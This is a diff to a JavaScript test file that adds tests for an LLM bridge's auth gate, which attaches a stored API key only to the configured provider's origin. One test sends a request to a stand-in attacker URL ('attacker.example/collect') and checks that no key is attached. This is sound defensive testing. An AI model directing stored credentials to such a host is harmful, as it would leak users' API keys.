@@ -25,14 +25,22 @@ vi.stubGlobal("window", {
     removeEventListener: vi.fn(),
 });
 // localStorage stub — pyodide.js reads debug flags in the token handler
+// and the LLM bridge reads settings (API key + configured provider
+// origin), so the stub is backed by a resettable bag.
+let localStorageData = {};
 vi.stubGlobal("localStorage", {
-    getItem: () => null,
-    setItem: () => {},
-    removeItem: () => {},
+    getItem: (k) => localStorageData[k] ?? null,
+    setItem: (k, v) => {
+        localStorageData[k] = String(v);
+    },
+    removeItem: (k) => {
+        delete localStorageData[k];
+    },
 });
 
 beforeEach(() => {
     MockWorker.instances = [];
+    localStorageData = {};
     vi.resetModules();
 });
 
@@ -844,5 +852,89 @@ describe("test-app message routing", () => {
                 actionsJson: JSON.stringify([{ read: "#date-input", prop: "value" }]),
             });
         }).not.toThrow();
+    });
+});
+
+describe("LLM bridge auth gate", () => {
+    // The worker chooses request URLs; the main thread holds the key.
+    // These tests pin the origin gate: the key is only attached when
+    // the request targets the configured provider's origin (derived
+    // via resolveBaseUrl, same as the kernel adapters).
+
+    const setSettings = (over = {}) => {
+        localStorageData["agex-settings"] = JSON.stringify({
+            apiKey: "sk-test",
+            accessMode: "openrouter",
+            ...over,
+        });
+    };
+
+    async function llmFetch(url) {
+        const fetchMock = vi.fn(async () => ({
+            ok: true,
+            json: async () => ({ done: true }),
+        }));
+        vi.stubGlobal("fetch", fetchMock);
+        const { startWorker } = await loadPyodide();
+        startWorker();
+        const w = MockWorker.instances[0];
+        w._receive({
+            type: "llm-fetch",
+            requestJson: JSON.stringify({ url, headers: {}, body: "{}" }),
+            id: 1,
+        });
+        await vi.waitFor(() => {
+            if (!w.posted.some((m) => m.type === "llm-fetch-result")) {
+                throw new Error("no llm-fetch-result yet");
+            }
+        });
+        return fetchMock.mock.calls[0][1].headers;
+    }
+
+    it("attaches Bearer auth on the configured OpenRouter origin", async () => {
+        setSettings();
+        const headers = await llmFetch(
+            "https://openrouter.ai/api/v1/chat/completions",
+        );
+        expect(headers["Authorization"]).toBe("Bearer sk-test");
+    });
+
+    it("refuses to attach the key to any other origin", async () => {
+        setSettings();
+        const headers = await llmFetch("https://attacker.example/collect");
+        expect(headers["Authorization"]).toBeUndefined();
+        expect(headers["x-api-key"]).toBeUndefined();
+    });
+
+    it("custom mode: attaches auth on the user's own base URL origin", async () => {
+        setSettings({ accessMode: "custom", baseUrl: "http://localhost:11434/v1" });
+        const headers = await llmFetch(
+            "http://localhost:11434/v1/chat/completions",
+        );
+        expect(headers["Authorization"]).toBe("Bearer sk-test");
+    });
+
+    it("custom-mode Anthropic direct uses x-api-key on its own origin", async () => {
+        setSettings({ accessMode: "custom", baseUrl: "https://api.anthropic.com" });
+        const headers = await llmFetch("https://api.anthropic.com/v1/messages");
+        expect(headers["x-api-key"]).toBe("sk-test");
+        expect(headers["Authorization"]).toBeUndefined();
+    });
+
+    it("openrouter mode does NOT authenticate api.anthropic.com", async () => {
+        // Pre-gate code special-cased api.anthropic.com by hostname
+        // sniffing alone; with the gate, an off-origin Anthropic URL
+        // gets no credential when OpenRouter is the configured target.
+        setSettings();
+        const headers = await llmFetch("https://api.anthropic.com/v1/messages");
+        expect(headers["x-api-key"]).toBeUndefined();
+        expect(headers["Authorization"]).toBeUndefined();
+    });
+
+    it("attaches nothing when no settings are stored", async () => {
+        const headers = await llmFetch(
+            "https://openrouter.ai/api/v1/chat/completions",
+        );
+        expect(headers["Authorization"]).toBeUndefined();
     });
 });
